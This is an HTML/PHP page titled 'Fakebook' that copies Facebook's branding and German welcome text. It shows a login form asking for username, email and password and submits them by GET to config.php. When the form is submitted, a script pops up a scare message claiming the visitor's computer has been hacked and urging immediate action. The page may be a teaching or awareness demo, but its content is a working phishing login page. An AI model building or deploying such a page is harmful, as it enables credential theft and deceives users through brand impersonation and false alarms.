<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <style media="screen">
    .img {
     
      
      top: 20%;
      left: 40%;
      display: block;
      margin-top: 270px;
      margin-left: 120px;
      margin-right: 50px;
      width: 20%; 
       
    }

    .text {
      font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
    font-size: 28px;
    top: 40%;
    color: #fcfcfc;
    font-weight: normal;
    line-height: 32px;
    margin-top: 10px;
        margin-left: 120px;
        margin-right: 50px;
       
    width:500px
    }

    #cookie-popup {
        text-align: center;
        background: #fff;
        position: fixed;
        top: 20%;
        left: 0%;

        right: 0;
        z-index: 9999;
        font-size: 20px;
        line-height: 20px;
        padding: 20px;
        -webkit-box-shadow: 0px 0px 5px 0px rgba(0, 0, 0, 0.2);
        -moz-box-shadow: 0px 0px 5px 0px rgba(0, 0, 0, 0.2);
        box-shadow: 0px 0px 5px 0px rgba(0, 0, 0, 0.2);
    }

    body {
        margin: 0;
        padding: 0;
        font-family: sans-serif;
        background-image: url(facebook-hintergrund-mit-logos_125322-28.jpg.webp);
        background-size: cover;
    }

    .box {
        position: absolute;
        top: 50%;
        left: 60%;
        transform: translate(-50%, -50%);
        width: 400px;
        padding: 40px;
        background: rgba(0, 0, 0, 0.6);
        box-sizing: border-box;
        box-shadow: 0 15px 25px rgba(0, 0, 0, 0.5);
        border-radius: 10px;
    }


    .box h2 {
        margin: 0 0 30px;
        padding: 0px;
        color: #fff;
        text-align: left;
    }

    .box .input-box {
        position: relative;
    }

    .box .input-box input {
        width: 100%;
        padding: 10px 0px;
        font-size: 16px;
        color: #fff;
        letter-spacing: 1px;
        margin-bottom: 30px;
        border: none;
        outline: none;
        background: transparent;
        border-bottom: 1px solid #fff;
    }

    .box .input-box label {
        position: absolute;
        top: 0;
        left: 0;
        letter-spacing: 1px;
        padding: 10px 0px;
        font-size: 16px;
        color: #fff;
        transition: .5s;
    }

    .box .input-box input:focus~label,
    .box .input-box input:valid~label {
        top: -18px;
        left: 0px;
        color: #03a9f4;
        font-size: 12px;
    }


    button {
        background: transparent;
        border: none;
        outline: none;
        color: #fff;
        background: #227be3;
        padding: 10px 20px;
        border-radius: 5px;
        cursor: pointer;
    }

    #cookie-popup.hidden {
        display: none;
    }
    </style>
    <title>Fakebook</title>
</head>

<body>
    <div class="logo">
        <img src="Facebook-Logo.png" alt="" style="width:225px;" class="img">

    </div>
    <h3 class="text" >Auf Fakebook bleibst du mit Menschen <br> in Verbindung und teilst Fotos, Videos <br> und vieles
        mehr mit ihnen.</h3>
    <div class="box">
        <script type="text/javascript" src="custom.js"></script>
        <?php 
  if( isset($_COOKIE['setCookieHinweis']) ) { 
    $showPopup = false;
  } else {
    $showPopup = true;
  }
?>
        <?php if($showPopup) { ?>


        <div id="cookie-popup">
            <div class="hinweis">
                <p>Wir verwenden Cookies. Durch die weitere Nutzung der Webseite stimmen Sie der Verwendung von Cookies
                    zu.</p>
            </div>

            <button onclick='cookieOk()'>OK, ich bin einverstanden.</button>
        </div>
        <?php  }; ?>

        <h2>Bei Fakebook anmelden</h2>

        <form action="config.php" method="get">
            <div class="input-box">
                <input type="text" name="username" autocomplete="off" required>
                <label for="">Username</label>
            </div>
            <div class="input-box">
                <input type="email" name="email" autocomplete="off" required>
                <label for="">Email</label>
            </div>
            <div class="input-box">
                <input type="password" name="password" autocomplete="off" required>
                <label for="">Password</label>
            </div>


            <button onclick='handleFormSubmit()'>Anmelden</button>

            <script type="text/javascript">
            function handleFormSubmit(form) {
                popUp();
                form.submit();
            }

            function popUp() {
                alert(
                    "        *IHR COMPUTER WURDE GEHACKT* \n All Ihre Handlungen auf dem Gerät werden von \neinem Hacker verfolgt. Sofortiges Handeln ist notwendig!"
                );
            }
            </script>


        </form>
    </div>
</body>

</html>